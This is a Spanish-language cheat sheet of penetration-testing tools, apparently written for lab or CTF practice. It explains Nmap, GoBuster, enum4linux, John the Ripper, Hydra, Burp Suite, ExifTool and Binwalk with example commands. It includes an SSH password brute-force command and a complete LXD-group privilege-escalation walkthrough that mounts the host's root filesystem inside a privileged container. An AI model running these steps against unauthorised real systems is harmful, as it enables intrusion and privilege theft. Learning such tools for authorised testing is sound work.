
- ***NMAP***: "Network Mapper", es una herramienta de escaneo de red de código abierto y gratuita que se utiliza para descubrir hosts y servicios en una red de computadoras.
	
	Ejemplo de comando: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.11.161 -oA allPorts
	
	sudo: Este comando se utiliza para ejecutar el siguiente comando con privilegios de superusuario (administrador). Algunas funciones de nmap pueden requerir privilegios elevados para funcionar correctamente.

    nmap: Es el comando principal para ejecutar la herramienta Nmap, una utilidad popular de escaneo de puertos y red.

    -p-: La opción -p especifica los puertos que deseas escanear. Al usar -p-, le estás diciendo a Nmap que escanee todos los puertos posibles (1-65535).

    --open: Esta opción le indica a Nmap que muestre solo los puertos abiertos en la salida.

    -sS: La opción -sS especifica el tipo de escaneo a realizar. En este caso, estás utilizando un escaneo SYN (también conocido como "escaneo sigiloso" o "half-open scan"), que es un tipo de escaneo que no completa el proceso de conexión TCP, lo que lo hace más difícil de detectar.

    --min-rate 5000: La opción --min-rate establece la velocidad mínima de envío de paquetes en paquetes por segundo. En este ejemplo, estás estableciendo una velocidad mínima de 5000 paquetes por segundo para acelerar el escaneo.

    -vvv: Esta opción aumenta el nivel de verbosidad de la salida de Nmap. Cuantas más v se incluyan, más detallada será la salida. En este caso, estás utilizando tres v para una salida muy detallada.

    -n: La opción -n le indica a Nmap que no realice una resolución de DNS, lo que puede acelerar el escaneo.

    -Pn: Esta opción le indica a Nmap que no realice un ping antes de escanear. Al usar -Pn, Nmap asume que el host está activo y procede directamente al escaneo de puertos. Esto es útil cuando un host no responde a pings pero aún tiene puertos abiertos.

    192.168.11.161: Esta es la dirección IP del objetivo que deseas escanear.

    -oA allPorts: La opción -oA indica a Nmap que guarde la salida del escaneo en un archivo con el nombre proporcionado (allPorts en este caso) en tres formatos diferentes: normal, XML y grepable.

  



- ***GoBuster***: herramienta de escaneo de directorios y archivos en sitios web y servidores, así como de fuerza bruta de subdominios, utilizando palabras de un diccionario. 
	La herramienta es útil para descubrir directorios, archivos y subdominios no enumerados o escondidos que pueden contener información sensible o vulnerabilidades.
	GoBuster también puede utilizarse para buscar subdominios con la opción dns. Por ejemplo, si deseas buscar subdominios de example.com utilizando el archivo de diccionario wordlist.txt:
	Comando: gobuster dns -d example.com -w wordlist.txt


	Ejemplo de comando: gobuster dir -u http://10.10.88.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


	gobuster: Es el comando principal para ejecutar la herramienta GoBuster, una utilidad de escaneo de directorios y archivos en sitios web y servidores.

    dir: Indica que deseas realizar un escaneo de directorios y archivos en el sitio web proporcionado. GoBuster también admite otros modos como dns para buscar subdominios, pero en este caso, estás utilizando el modo dir.

    -u http://10.10.88.69: La opción -u especifica la URL del objetivo que deseas escanear. En este caso, es http://10.10.88.69. Reemplaza la dirección IP con la dirección IP o el dominio del objetivo real que deseas escanear.

    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: La opción -w indica el archivo de diccionario que se utilizará para realizar la búsqueda de directorios y archivos ocultos.
	En este ejemplo, estás utilizando el archivo de diccionario directory-list-2.3-medium.txt que se encuentra en el directorio /usr/share/wordlists/dirbuster/. 
	Este archivo de diccionario contiene una lista de palabras (nombres de directorios y archivos) que GoBuster probará en el sitio web objetivo para encontrar coincidencias.





- ***enum4linux***: Herramienta de enumeración basada en Perl. Ayuda a obtener información sobre usuarios, grupos, comparticiones.

	
	Ejemplo de comando: /usr/share/enum4linux/enum4linux.pl -a 10.10.88.69. 

	
	/usr/share/enum4linux/enum4linux.pl: Esta es la ruta al script Perl de la herramienta enum4linux en el sistema. El archivo "enum4linux.pl" es un script Perl que contiene el código necesario para ejecutar la herramienta.

    -a: La opción -a es un modificador que indica a enum4linux que realice todas las comprobaciones básicas de enumeración. Esto incluye la enumeración de usuarios, grupos, comparticiones y otros detalles del sistema objetivo.

    10.10.88.69: Esta es la dirección IP del sistema Windows o servidor SMB al que se dirigirá el comando enum4linux para realizar la enumeración.

  



- ***John the Ripper***: Herramienta de cracking de contraseñas offline y encriptadas en diferentes formatos. Trabaja descifrando hashes de contraseñas almacenados en archivos.

	
	Ejemplo de comando: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  ||  john --wordlist=/usr/share/wordlists/rockyou.txt --format=MD5 hashes.txt
	
	
	john: Este es el comando principal para ejecutar la herramienta John the Ripper.
	
	Guarda el hash en un archivo de texto: Copia y pega el hash en un archivo de texto (por ejemplo, hashes.txt). Si tienes varios hashes, colócalos en líneas separadas dentro del archivo.

	Identifica el formato de hash: Determina qué algoritmo de hash se utilizó para encriptar la contraseña. Puede ser MD5, SHA-1, bcrypt, entre otros. A veces, 
	esto puede ser complicado si no tienes información adicional sobre cómo se generó el hash.

	Utiliza John the Ripper con el formato de hash y el método de ataque adecuado. Por ejemplo, si el formato de hash es MD5 y deseas utilizar un ataque de diccionario con el archivo rockyou.txt
	
	Puedes ejecutar John the Ripper sin la opción --format, y en ese caso, John intentará detectar automáticamente el formato de hash en función de la estructura del hash proporcionado en el archivo de texto. 
	Sin embargo, la detección automática no siempre es 100% precisa y puede llevar más tiempo, ya que John intentará diferentes formatos de hash hasta que encuentre el correcto.





- ***Hydra***: Herramienta para descifrar contraseñas por fuerza bruta. 

	
	Ejemplo de comando: hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.184


	hydra: Este es el comando principal para ejecutar la herramienta Hydra. Se usa para iniciar el ataque de fuerza bruta.
	
    -l jan: La opción -l especifica el nombre de usuario para el que intentaremos adivinar la contraseña. En este caso, el nombre de usuario es "jan".

    -P /usr/share/wordlists/rockyou.txt: La opción -P se utiliza para especificar el archivo de diccionario que contiene las contraseñas que se probarán en el ataque de fuerza bruta. 
	Aquí, se utiliza el archivo "rockyou.txt", que es un archivo de diccionario muy conocido que contiene una gran cantidad de contraseñas reales y comunes.

    ssh://10.10.123.184: Este es el protocolo y la dirección IP del objetivo al que se dirigirá el ataque. 
	En este caso, el protocolo es SSH (Secure Shell), que es un protocolo de red utilizado para acceder de forma segura a sistemas remotos. La dirección IP del objetivo es "10.10.123.184".


 
	
	
- ***LXD***: LXD (Linux Container Daemon) es una herramienta para gestionar contenedores Linux a nivel de sistema operativo. Estos contenedores son similares a las máquinas virtuales, 
	pero son más ligeros y tienen un rendimiento cercano al de un sistema operativo nativo, ya que comparten el mismo núcleo que el host pero tienen espacios de usuario separados.

	El método de escalado de privilegios LXD es una técnica de explotación que se aprovecha de la falta de restricciones adecuadas en la configuración de LXD. 
	Si un usuario tiene acceso a un grupo LXD en un sistema comprometido, puede aprovecharse de esto para crear un contenedor que tenga acceso a todo el sistema de archivos del host. 
	Esto permitiría al atacante explorar el sistema y potencialmente obtener acceso a archivos y recursos confidenciales, lo que efectivamente escala sus privilegios en el sistema.

	Aquí hay un ejemplo de cómo se podría ejecutar un ataque de escalado de privilegios LXD:


    Verificar que el usuario actual es parte del grupo LXD:
	
	Comando: id


	Inicializar LXD si aún no está configurado:
	
	Comando: lxd init


	(Acepta los valores predeterminados o personaliza la configuración según sea necesario)
	Importar una imagen de contenedor en el host comprometido. Por ejemplo, descarga una imagen de Alpine Linux:

	Comando: wget https://images.linuxcontainers.org/images/alpine/3.14/amd64/default/20211012_13:00/lxd.tar.xz
	Comando: wget https://images.linuxcontainers.org/images/alpine/3.14/amd64/default/20211012_13:00/rootfs.squashfs


	Importar la imagen descargada a LXD:

	Comando: lxc image import lxd.tar.xz rootfs.squashfs --alias alpine


	Crear y ejecutar un nuevo contenedor utilizando la imagen importada:

	Comando: lxc init alpine my-container -c security.privileged=true


	Montar el sistema de archivos del host en el contenedor:

	Comando: lxc config device add my-container host-root disk source=/ path=/mnt/root recursive=true


	Iniciar y unirse al contenedor:

	Comando: lxc start my-container
	Comando: lxc exec my-container /bin/sh


	Navegar al directorio /mnt/root dentro del contenedor, que ahora es un punto de montaje del sistema de archivos del host:

	Comando: cd /mnt/root

	Una vez dentro del contenedor, tendrás acceso completo al sistema de archivos del host y podrás explorarlo para buscar información sensible o modificar archivos según sea necesario. 
	Esto efectivamente escala tus privilegios en el sistema.
	Es importante destacar que este método de escalado de privilegios solo funcionará si el usuario actual tiene acceso al grupo LXD en el sistema comprometido y si LXD está mal configurado o no tiene las restricciones de seguridad adecuadas.
	Además, este método no funcionará si el sistema no tiene LXD instalado.



- ***Burp Suite***: Plataforma integrada para realizar pruebas de seguridad de aplicaciones web. Su funcionalidad incluye interceptación y modificación de solicitudes, escaneo automático de vulnerabilidades, repetidor (para manipular y reenviar solicitudes individuales), decodificador de datos y mucho más.

Ejemplo de comando: No es una herramienta de línea de comandos, pero es ampliamente utilizada para el pentesting y la configuración sería la siguiente:

	 
  	Abre Burp Suite.
  	En la pestaña "Proxy" -> "Options" -> "Add", asegúrate de tener un listener en la interfaz de bucle invertido (127.0.0.1) en el puerto 8080 (o el puerto que prefieras).
  	Configura tu navegador para que use el proxy de Burp Suite (127.0.0.1 en el puerto 8080) para el tráfico HTTP y HTTPS.
  	Habilita la intercepción en la pestaña "Intercept" y navega por la web. El tráfico se interceptará en Burp Suite, permitiéndote analizar y modificar las solicitudes.
  	Para escanear automáticamente las vulnerabilidades, puedes utilizar la pestaña "Scanner" y para reenviar las solicitudes modificadas, puedes utilizar la herramienta "Repeater".


 
- ***ExifTool***: Es una herramienta de línea de comandos utilizada para leer, escribir y manipular metadatos en una variedad de archivos, particularmente fotos y vídeos. Los metadatos pueden incluir detalles como el modelo de la cámara, la longitud focal, la hora en que se tomó la foto, la ubicación (si el dispositivo tenía GPS) y más.

	Ejemplo de comando: exiftool mi_foto.jpg

	exiftool: Este es el comando principal para ejecutar la herramienta ExifTool.

	mi_foto.jpg: Reemplaza "mi_foto.jpg" con el nombre del archivo cuyos metadatos deseas leer. Si tienes una carpeta llena de imágenes y quieres ver los metadatos de todas ellas, puedes hacerlo con: exiftool *.jpg

	Ejemplo de comando para eliminar todos los metadatos: exiftool -all= mi_foto.jpg

	-all=: La opción -all= le dice a ExifTool que elimine todos los metadatos del archivo especificado. Reemplaza "mi_foto.jpg" con el nombre del archivo cuyos metadatos deseas eliminar.


- ***Binwalk***: Funciona de manera parecida a Exiftool. Es una herramienta para el análisis de archivos binarios y es especialmente útil para el análisis de firmware. Binwalk puede escanear un archivo binario en busca de firmas conocidas y mostrar información sobre cualquier coincidencia que encuentre. A menudo se utiliza para descubrir los contenidos de un firmware, extraer archivos de un blob de datos binarios, o incluso para realizar ingeniería inversa. Binwalk tambíen es capaz de reconocer firmas de archivo como las de los archivos ZIP.

	Si tienes una imagen que sospechas que contiene un archivo ZIP incrustado, puedes utilizar Binwalk para buscar la firma del archivo ZIP en los datos binarios de la imagen. Si Binwalk encuentra la 	firma, puedes utilizarlo para extraer el archivo ZIP de la imagen.

  	Ejemplo de comando: binwalk --dd='.*' image.jpg

  	 La opción --dd='.*' especifica que Binwalk debería descomprimir archivos de cualquier tipo (la expresión regular .* coincide con cualquier secuencia de caracteres).

